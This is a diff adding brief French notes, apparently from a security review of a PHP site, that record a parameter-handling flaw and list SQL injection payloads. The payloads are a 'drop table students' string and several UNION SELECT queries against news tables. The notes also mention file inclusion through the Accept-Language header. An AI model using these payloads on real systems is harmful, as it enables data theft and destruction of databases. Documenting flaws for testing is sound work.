@@ -1,0 +1,13 @@
+
+$start : check intval sur $_REQUEST, chope $_GET
+	POST : start=1
+	GET : start=robert'); drop table students; --
+	voire get = 1 UNION whatevs;
+
+	0,5%20UNION%20SELECT%20id,pseudo%20FROM%20news%20LIMIT%200,
+	0,5 UNION SELECT id,pseudo FROM news LIMIT 0,
+	0,5 UNION SELECT id, date, auteur as pseudo, text FROM comm_news LIMIT 0
+	1,5 UNION SELECT id,date,pseudo,text FROM news ORDER BY id DESC LIMIT 0
+
+
+$_SERVER['HTTP_ACCEPT_LANGUAGE'] injection to include any file
